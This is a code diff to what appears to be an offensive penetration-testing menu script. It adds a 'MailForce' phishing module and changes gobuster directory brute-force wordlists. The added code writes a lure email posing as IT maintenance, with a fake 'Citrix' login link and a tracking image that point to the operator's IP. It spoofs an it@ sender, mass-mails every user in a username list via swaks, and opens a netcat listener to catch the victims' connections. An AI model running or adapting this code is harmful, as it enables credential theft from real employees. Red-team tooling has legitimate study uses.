@@ -2620,8 +2620,39 @@ while True:
          localip = linecache.getline("ip.tmp",1)
          localip = localip.rstrip("\n")
          localip,null = localip.split("/")
-         command("gnome-terminal --tab --title 'WinMaster - MailForce' -e 'nc -nvlp 80'")
-         command("while read mail; do swaks -to $mail -from it@" + DOM.rstrip(" ") + " -header 'Subject: Credentials / Errors' -body 'goto http://" + localip + "' -server " + TIP.rstrip(" ") + "; done < usernames.txt")
+         command("xdotool key Ctrl+Shift+T")
+         command("xdotool key Alt+Shift+S; xdotool type 'MailForce'; xdotool key Return; sleep 2")
+         command("xdotool type 'nc -nvlp 80'; xdotool key Return")
+         command("xdotool key Ctrl+Shift+Tab")
+         
+         phiser = "it@" + DOM.rstrip(" ")       
+                 
+         command('echo "Hello.\n" > body.txt')
+         command('echo " We just performed manitenance on our servers." >> body.txt')
+         command('echo " Please verify if you can still access the login page:\n" >> body.txt')
+         command('echo " Citrix http://"' + localip + '"/" >> body.txt')
+         link = ' <a href=\"http://' + localip + '\">click me.</a>'
+         command("echo '" + link + "' >> body.txt")
+         command('echo " <img src=\""' + localip + '"/img\">" >> body.txt')
+         command('echo "\nRegards," >> body.txt')
+         command('echo ""' + phiser + '""  >> body.txt')
+         
+         print("[*] Created phishing email...\n")
+         print(colored("Subject: Credentials / Errors\n", colour2))
+         
+         with open("body.txt", "r") as list:
+            for phish in list:
+               phish = phish.rstrip("\n")
+               print(colored(phish,colour2))
+            print("")
+                 
+         with open("usernames.txt", "r") as list:
+            for phish in list:
+               phish = phish.rstrip("\n")
+               phish = phish + "@"
+               phish = phish + DOM.rstrip(" ")
+               command("swaks --to " + phish + " --from " + phiser + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.txt > log.txt")
+               print("[+] Mail sent to " + phish + "...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2646,7 +2677,8 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : COVID-3
-# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP
+# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
+# Details : Alternative dictionary - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2655,12 +2687,12 @@ while True:
          print("\n[-] Remote IP address has not been specified...")
       else:
          if WEB[:5] == "EMPTY":
-            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50")
+            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
          else:
             if (WEB[:5] == "https") or (WEB[:5] == "HTTPS"):
-               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u '" + WEB.rstrip(" ") + "' -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -k") 
+               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u '" + WEB.rstrip(" ") + "' -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50 -k") 
             else: 
-               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50")
+               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
